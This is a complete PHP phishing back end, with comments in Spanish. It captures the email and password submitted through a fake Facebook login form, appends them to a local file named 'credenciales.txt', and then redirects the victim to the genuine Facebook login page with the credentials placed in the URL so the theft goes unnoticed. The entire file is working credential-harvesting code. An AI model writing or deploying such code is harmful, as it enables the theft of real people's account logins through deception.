<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = $_POST['email'];
    $password = $_POST['pass'];

    // Guardar datos en un archivo de texto
    $file = fopen('credenciales.txt', 'a');
    fwrite($file, "Email: $email, Password: $password\n");
    fwrite($file,"---------------------------------------------");
    fclose($file);

    // Redirigir al usuario a la página oficial de Facebook con los datos de login
    header("Location: https://www.facebook.com/login.php?email=$email&pass=$password");
    exit();
}
?>
